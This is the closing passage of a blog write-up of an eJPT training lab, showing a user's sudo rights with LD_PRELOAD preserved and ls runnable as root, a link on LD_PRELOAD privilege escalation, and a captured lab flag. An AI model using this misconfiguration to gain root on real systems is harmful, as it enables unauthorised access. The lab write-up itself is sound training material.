Matching Defaults entries <span style="color:#66d9ef">for</span> robert on server3.ine.local:
    env_reset, mail_badpass,
    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin,
    env_keep<span style="color:#f92672">+=</span>LD_PRELOAD

User robert may run the following commands on server3.ine.local:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /bin/ls
</code></pre></div><p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/">https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/</a></p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220621181341.png" alt=""  />
</p>
<p>flag3
<code>560648FC63F090A8CF776326DC13FAC7</code></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://suszczyk.github.io/tags/linux/">Linux</a></li>
      <li><a href="https://suszczyk.github.io/tags/easy/">Easy</a></li>
      <li><a href="https://suszczyk.github.io/tags/ejpt/">eJPT</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://suszczyk.github.io/posts/hackthebox/logforge/">
    <span class="title">« Prev Page</span>
    <br>
    <span>LogForge - HackTheBox</span>
  </a>
  <a class="next" href="https://suszczyk.github.io/posts/ejpt/black-box-penetration-test-2/">
    <span class="title">Next Page »</span>
    <br>
    <span>Black-Box Penetration Test 2</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share Black-Box Penetration Test 3 on twitter"
        href="https://twitter.com/intent/tweet/?text=Black-Box%20Penetration%20Test%203&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-3%2f&amp;hashtags=Linux%2cEasy%2ceJPT">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Black-Box Penetration Test 3 on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-3%2f&amp;title=Black-Box%20Penetration%20Test%203&amp;summary=Black-Box%20Penetration%20Test%203&amp;source=https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-3%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Black-Box Penetration Test 3 on reddit"
        href="https://reddit.com/submit?url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-3%2f&title=Black-Box%20Penetration%20Test%203">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Black-Box Penetration Test 3 on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-3%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Black-Box Penetration Test 3 on whatsapp"
        href="https://api.whatsapp.com/send?text=Black-Box%20Penetration%20Test%203%20-%20https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-3%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Black-Box Penetration Test 3 on telegram"
        href="https://telegram.me/share/url?text=Black-Box%20Penetration%20Test%203&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fejpt%2fblack-box-penetration-test-3%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="https://suszczyk.github.io">Mateusz Suszczyk</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerText = 'copy';

        function copyingDone() {
            copybutton.innerText = 'copied!';
            setTimeout(() => {
                copybutton.innerText = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
